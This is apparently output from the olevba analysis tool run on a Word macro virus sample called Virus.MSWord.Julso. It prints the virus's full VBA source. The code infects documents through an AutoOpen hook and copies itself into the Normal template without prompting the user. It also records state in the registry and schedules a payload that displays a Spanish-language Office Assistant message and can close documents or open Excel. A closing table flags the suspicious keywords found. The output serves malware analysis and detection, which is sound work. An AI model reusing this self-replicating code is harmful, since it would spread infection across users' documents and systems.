olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Julso
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Julso - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Julso - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#Const depurar = False
Public Const MacroName = "AutoOpen"
Public Const Version = 5
Public Sub Main()
Dim r As Boolean
Dim ret As String
Dim fechaInst As String
#If depurar Then
   unNombre = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Defname")
MsgBox unNombre
#End If
Options.SaveNormalPrompt = False
If CheckIt(NormalTemplate) = True Then
  #If depurar Then
    MsgBox "Plantilla Normal infectada"
  #End If
  If CheckIt(ActiveDocument) = True Then
    #If depurar Then
      MsgBox "Documento " & ActiveDocument.Name & " infectado"
    #End If
    If MacroContainer.Name <> NormalTemplate.Name Then
      System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "Version") = Str(Version)
      Application.Run "Normal.AutoOpen.AdjustMajorVersion"
      ret = System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "ReturnValue")
      If ret = "False" Then
        r = DisInfect(NormalTemplate.FullName)
        NormalTemplate.Save
      End If
    End If
  Else
    #If depurar Then
      MsgBox "Documento " & ActiveDocument.Name & " no infectado"
    #End If
    r = Infect(NormalTemplate.FullName, ActiveDocument.FullName)
    ActiveDocument.Save
  End If
Else
  #If depurar Then
    MsgBox "Plantilla Normal no infectada"
  #End If
  r = Infect(ActiveDocument.FullName, NormalTemplate.FullName)
  NormalTemplate.Save
End If
Options.SaveNormalPrompt = True
fechaInst = System.PrivateProfileString("", _
    "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "DateInstallation")
If fechaInst <> "" Then
  Application.OnTime when:=TimeValue(fechaInst) + TimeValue("00:10"), Name:="PayLoad"
Else
  System.PrivateProfileString("", _
    "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "DateInstallation") = Now
End If
'Proporcionar algo útil
'Set bln = Assistant.NewBalloon
'With bln
'  .Heading = "Ayuda en directo"
'  .Text = "¿Qué desea hacer con este documento?"
'  .Labels(1).Text = "Sólo abrirlo"
'  .Labels(2).Text = "Imprimirlo y cerrarlo"
'  .Labels(3).Text = "Imprimirlo y dejarlo abierto"
'  .Labels(4).Text = "Borrarlo"
'  .Labels(5).Text = "Nada (cerrar)"
'  .Mode = msoModeModal
'  res = .Show
'End With
'Select Case res
'  Case Is < 1
'  Case 2
'    ActiveDocument.PrintOut
'    ActiveDocument.Close wdDoNotSaveChanges
'  Case 3
'    ActiveDocument.PrintOut
'  Case 4
'  Case 5
'    ActiveDocument.Close wdDoNotSaveChanges
'End Select
'MsgBox res
End Sub
Function CheckIt(doctm As Object) As Boolean
On Error GoTo No_Infectado
Set OwnMacro = doctm.VBProject.VBComponents(MacroName)
CheckIt = True
Exit Function
No_Infectado:
  CheckIt = False
End Function
Function Infect(src As String, dest As String) As Boolean
On Error GoTo Falla_Infect
Application.OrganizerCopy _
   src, dest, _
   MacroName, wdOrganizerObjectProjectItems
Infect = True
Exit Function
Falla_Infect:
  Infect = False
End Function
Function DisInfect(here As String) As Boolean
On Error GoTo Falla_DisInfect
Application.OrganizerDelete _
   here, _
   MacroName, wdOrganizerObjectProjectItems
DisInfect = True
Exit Function
Falla_DisInfect:
  DisInfect = False
End Function
Sub AdjustMajorVersion()
Dim SuVersion As Integer
Dim r As Boolean
SuVersion = System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "Version")
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "ReturnValue") = "True"
If SuVersion < Version Then
  r = DisInfect(ActiveDocument.FullName)
  ActiveDocument.Save
Else
  System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Software\Julk Software Inc.\MacroVirus", "ReturnValue") = "False"
End If
End Sub
Sub PayLoad()
Dim xlApp As Object ' Declara la variable para mantener la referencia.
'Proporcionar algo útil
Set bln = Assistant.NewBalloon
With bln
  .Heading = "¡Hola, Soy un virus de macro!"
  .Text = "Afortunadamente no soy dañino, he sido programado" & _
  " para controlar al Ayudante de Office y obligarle a que muestre" & _
  " este globo que esta viendo. Pero si fuera uno de esos malvados, en este momento" & _
  " podría actuar a mi antojo contra los siguientes objetivos tácticos:"
  .Labels(1).Text = "Sus documentos abiertos:"
  For Each doc In Documents
    .Labels(1).Text = .Labels(1).Text & doc.Name
  Next doc
  .Labels(2).Text = "Todos sus archivos del disco duro..."
  .Labels(3).Text = "El registro maestro de Windows (dónde se almacena toda la configuración del sistema)..."
  .Labels(4).Text = "Las otras aplicaciones Windows"
  .Labels(5).Text = "Y en resumen, a lo todo su equipo informático (con consecuencias desastrosas para él y para usted)."
  .Mode = msoModeModal
  '.Mode = msoModeModeless
  .Animation = msoAnimationGreeting
  .Button = msoButtonSetOK
  res = .Show
End With
Select Case res
  Case Is < 1
  Case 1
    For Each doc In Documents
      doc.Close wdSaveChanges
    Next doc
  Case 2
  Case 3
  Case 4
    Set xlApp = CreateObject("excel.application")
    ' Puede tener la propiedad Visible a True
    ' si quiere ver la aplicación.
    xlApp.Visible = True
    ' Utiliza xlApp para tener acceso a otros objetos
    ' Microsoft Excel.
    xlApp.WorkBooks.Add
    'xlApp.Quit  ' Cuando finaliza, utiliza el método Quit para cerrar
    Set xlApp = Nothing ' la aplicación, después libera la referencia.
  Case 5
End Select
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

